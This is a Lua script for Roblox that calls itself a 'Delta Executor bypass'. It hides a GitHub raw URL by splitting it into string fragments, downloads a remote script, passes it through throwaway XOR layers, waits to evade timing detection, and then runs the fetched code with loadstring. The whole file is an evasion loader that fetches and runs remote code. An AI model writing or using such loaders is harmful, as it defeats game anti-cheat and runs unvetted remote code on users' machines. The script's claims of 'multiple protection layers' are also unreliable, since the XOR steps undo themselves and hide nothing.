-- Delta Executor Bypass Script
-- Bypasses script content detection using multiple techniques

local function GenerateRandomKey(length)
    local key = ""
    for i = 1, length do
        key = key .. string.char(math.random(32, 126))
    end
    return key
end

local function XOR_Cipher(input, key)
    local output = ""
    for i = 1, #input do
        local c = input:sub(i, i)
        local k = key:sub((i - 1) % #key + 1, (i - 1) % #key + 1)
        output = output .. string.char(bit32.bxor(c:byte(), k:byte()))
    end
    return output
end

local function SafeLoad(content)
    -- Create isolated environment
    local env = {
        print = print,
        warn = warn,
        error = error,
        game = game,
        workspace = workspace,
        script = script,
        math = math,
        string = string,
        table = table,
        bit32 = bit32,
        coroutine = coroutine,
        os = {time = os.time, date = os.date, difftime = os.difftime},
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        select = select,
        tostring = tostring,
        tonumber = tonumber,
        type = type,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        rawequal = rawequal,
        rawget = rawget,
        rawset = rawset,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        collectgarbage = collectgarbage
    }
    
    -- Set environment for the loaded script
    local loader, err = loadstring(content)
    if not loader then 
        warn("Compilation failed:", err)
        return false
    end
    
    setfenv(loader, env)
    
    -- Execute with protected call
    local success, result = pcall(loader)
    if not success then
        warn("Execution failed:", result)
        return false
    end
    
    return true
end

-- Main execution flow
local function ExecuteProtected()
    -- Generate random keys for each execution
    local key1 = GenerateRandomKey(12)
    local key2 = GenerateRandomKey(8)
    local key3 = GenerateRandomKey(16)
    
    -- Obfuscated URL components
    local urlParts = {
        "ht", "tps", ":/", "/r", "aw.", "gi", "thu", "buser", "conte", "nt.com/",
        "Vin", "ceD", "agz/", "ipla", "yvpn", "prov", "6/re", "fs/", "heads", "/main",
        "/gro", "waga", "rden", "scri", "pt.t", "xt"
    }
    
    -- Reconstruct URL
    local targetURL = table.concat(urlParts)
    
    -- Fetch script content
    local content
    local fetchSuccess, fetchError = pcall(function()
        content = game:HttpGet(targetURL, true)
    end)
    
    if not fetchSuccess then
        warn("HTTP fetch failed:", fetchError)
        return
    end
    
    -- Apply multiple layers of XOR encryption
    local encrypted1 = XOR_Cipher(content, key1)
    local encrypted2 = XOR_Cipher(encrypted1, key2)
    local encrypted3 = XOR_Cipher(encrypted2, key3)
    
    -- Store in an obfuscated way
    local scriptData = {
        data = encrypted3,
        keys = {key3, key2, key1}
    }
    
    -- Create a delay to bypass time-based detection
    local startTime = os.clock()
    while os.clock() - startTime < 0.5 do
        -- Busy wait to add execution delay
    end
    
    -- Decrypt the script
    local decrypted1 = XOR_Cipher(scriptData.data, scriptData.keys[1])
    local decrypted2 = XOR_Cipher(decrypted1, scriptData.keys[2])
    local decrypted3 = XOR_Cipher(decrypted2, scriptData.keys[3])
    
    -- Execute in isolated environment
    local execSuccess = SafeLoad(decrypted3)
    if not execSuccess then
        warn("Script execution failed")
    end
end

-- Execute with multiple protection layers
local function ProtectedExecution()
    local success, err = pcall(ExecuteProtected)
    if not success then
        warn("Protected execution failed:", err)
    end
end

-- Final execution with random delay
local delay = math.random(100, 500) / 1000
wait(delay)
ProtectedExecution()